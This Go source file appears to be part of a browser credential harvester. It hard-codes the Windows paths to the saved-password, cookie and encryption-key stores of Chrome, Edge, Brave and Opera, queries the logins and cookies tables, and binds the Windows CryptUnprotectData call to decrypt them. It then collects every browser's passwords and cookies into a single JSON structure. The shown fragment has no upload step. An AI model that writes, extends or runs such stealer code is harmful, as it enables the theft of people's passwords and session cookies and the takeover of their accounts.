package chromium

import (
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

const (
	dllCrypt32Name  = "Crypt32.dll"
	dllKernel32Name = "Kernel32.dll"

	operaCookiesPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies"
	edgeCookiesPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
	braveCookiesPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
	chromeCookiesPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"

	operaPasswordPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
	edgePasswordPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
	bravePasswordPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
	chromePasswordPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

	operaKeyPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"
	edgeKeyPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
	braveKeyPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
	chromeKeyPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

	chromiumCookieQuery = `SELECT host_key as Domain, expires_utc as Expires, 
		is_httponly as HttpOnly, name as Name, path as Path, 
		is_secure as Secure, value as Value, encrypted_value as EncryptedValue 
		FROM cookies;`
	chromiumPasswordQuery = `SELECT origin_url as URL, username_value as Username, password_value as Password FROM logins;`
)

var (
	DLLCrypt32  = syscall.NewLazyDLL(dllCrypt32Name)
	DLLKernel32 = syscall.NewLazyDLL(dllKernel32Name)

	PCryptUnprotectData = DLLCrypt32.NewProc("CryptUnprotectData")
	PLocalFree          = DLLKernel32.NewProc("LocalFree")
)

// Cookie represents a cookie stored by a web browser.
type Cookie struct {
	Name           string `json:"name"`
	Value          string `json:"value"`
	Domain         string `json:"domain"`
	Path           string `json:"path"`
	Expires        string `json:"expires"`
	IsExpired      bool   `json:"isExpired"`
	IsSecure       bool   `json:"isSecure"`
	HttpOnly       bool   `json:"httpOnly"`
	EncryptedValue []byte `json:"encryptedValue"`
}

// Password represents a password stored by a web browser.
type Password struct {
	URL               string `json:"url"`
	Username          string `json:"username"`
	PasswordDecrypted string `json:"passwordDecrypted"`
	PasswordEncrypted []byte `json:"passwordEncrypted"`
}

// JSONStruct represents the structure of the JSON output, including all
// passwords and cookies from various browsers.
type JSONStruct struct {
	BravePasswords  []Password `json:"bravePasswords"`
	BraveCookies    []Cookie   `json:"braveCookies"`
	ChromePasswords []Password `json:"chromePasswords"`
	ChromeCookies   []Cookie   `json:"chromeCookies"`
	OperaPasswords  []Password `json:"operaPasswords"`
	OperaCookies    []Cookie   `json:"operaCookies"`
	EdgePasswords   []Password `json:"edgePasswords"`
	EdgeCookies     []Cookie   `json:"edgeCookies"`
}

// DataBlob represents a data blob as used by Windows cryptographic functions.
type DataBlob struct {
	cbData uint32
	pbData *byte
}

// toByteArray converts a DataBlob to a byte array.
func (b *DataBlob) toByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

// newBlob creates a new DataBlob from a byte slice.
func newBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}
